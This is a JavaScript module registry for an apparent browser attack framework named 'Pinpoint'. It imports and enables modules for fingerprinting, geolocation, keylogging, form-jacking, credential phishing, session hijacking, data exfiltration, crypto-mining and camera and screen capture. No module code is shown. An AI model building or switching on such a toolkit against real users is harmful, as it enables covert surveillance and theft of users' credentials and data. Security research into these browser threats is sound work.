/**
 * Pinpoint Framework: Module Registry
 */

import env_telemetry from '../../src/modules/level1/env_telemetry.js';
import node_health from '../../src/modules/level1/node_health.js';
import pwr_analytics from '../../src/modules/level1/pwr_analytics.js';
import software_profile from '../../src/modules/level1/software_profile.js';
import timezone_leak from '../../src/modules/level1/timezone_leak.js';
import speech_recon from '../../src/modules/level1/speech_recon.js';
import net_uplink from '../../src/modules/level2/net_uplink.js';
import internal_leak from '../../src/modules/level2/internal_leak.js';
import hardware_hash from '../../src/modules/level2/hardware_hash.js';
import hw_enumerate from '../../src/modules/level2/hw_enumerate.js';
import access_audit from '../../src/modules/level2/access_audit.js';
import webgl_deep_enum from '../../src/modules/level2/webgl_deep_enum.js';
import geospatial_fix from '../../src/modules/level3/geospatial_fix.js';
import civic_locator from '../../src/modules/level3/civic_locator.js';
import deep_token_hunt from '../../src/modules/level3/deep_token_hunt.js';
import identity_trace from '../../src/modules/level3/identity_trace.js';
import buffer_audit from '../../src/modules/level3/buffer_audit.js';
import gpu_attack from '../../src/modules/level4/gpu_attack.js';
import audio_fingerprint from '../../src/modules/level4/audio_fingerprint.js';
import sandbox_probe from '../../src/modules/level4/sandbox_probe.js';
import protocol_handler_scan from '../../src/modules/level1/protocol_handler_scan.js';
import dns_prefetch_scan from '../../src/modules/level2/dns_prefetch_scan.js';
import bluetooth_probe from '../../src/modules/level2/bluetooth_probe.js';
import usb_probe from '../../src/modules/level2/usb_probe.js';
import autofill_harvest from '../../src/modules/level3/autofill_harvest.js';
import credential_phish from '../../src/modules/level3/credential_phish.js';
import session_hijack from '../../src/modules/level3/session_hijack.js';
import indexeddb_raid from '../../src/modules/level3/indexeddb_raid.js';
import cache_exfil from '../../src/modules/level3/cache_exfil.js';
import history_sniff from '../../src/modules/level3/history_sniff.js';
import port_scanner from '../../src/modules/level4/port_scanner.js';
import service_worker_mitm from '../../src/modules/level4/service_worker_mitm.js';
import timing_oracle from '../../src/modules/level4/timing_oracle.js';
import webgl_shader_exploit from '../../src/modules/level4/webgl_shader_exploit.js';
import spectre_probe from '../../src/modules/level4/spectre_probe.js';
import dns_rebinding from '../../src/modules/level5/dns_rebinding.js';
import clickjack_engine from '../../src/modules/level5/clickjack_engine.js';
import pastejack from '../../src/modules/level5/pastejack.js';
import cache_poison_attack from '../../src/modules/level5/cache_poison_attack.js';
import tab_napping from '../../src/modules/level5/tab_napping.js';
import keylogger from '../../src/modules/level5/keylogger.js';
import formjack from '../../src/modules/level5/formjack.js';
import crypto_miner from '../../src/modules/level5/crypto_miner.js';
import notification_phish from '../../src/modules/level6/notification_phish.js';
import oauth_hijack from '../../src/modules/level6/oauth_hijack.js';
import download_drive_by from '../../src/modules/level6/download_drive_by.js';
import permission_abuse from '../../src/modules/level6/permission_abuse.js';
import screen_capture from '../../src/modules/level6/screen_capture.js';
import camera_capture from '../../src/modules/level6/camera_capture.js';
import display_metrics from '../../src/modules/level1/display_metrics.js';
import network_info_audit from '../../src/modules/level2/network_info_audit.js';

export const activeModules = [
  env_telemetry,
  node_health,
  pwr_analytics,
  software_profile,
  timezone_leak,
  speech_recon,
  net_uplink,
  internal_leak,
  hardware_hash,
  hw_enumerate,
  access_audit,
  webgl_deep_enum,
  geospatial_fix,
  civic_locator,
  deep_token_hunt,
  identity_trace,
  buffer_audit,
  gpu_attack,
  audio_fingerprint,
  sandbox_probe,
  protocol_handler_scan,
  dns_prefetch_scan,
  bluetooth_probe,
  usb_probe,
  autofill_harvest,
  credential_phish,
  session_hijack,
  indexeddb_raid,
  cache_exfil,
  history_sniff,
  port_scanner,
  service_worker_mitm,
  timing_oracle,
  webgl_shader_exploit,
  spectre_probe,
  dns_rebinding,
  clickjack_engine,
  pastejack,
  cache_poison_attack,
  tab_napping,
  keylogger,
  formjack,
  crypto_miner,
  notification_phish,
  oauth_hijack,
  download_drive_by,
  permission_abuse,
  screen_capture,
  camera_capture,
  display_metrics,
  network_info_audit
];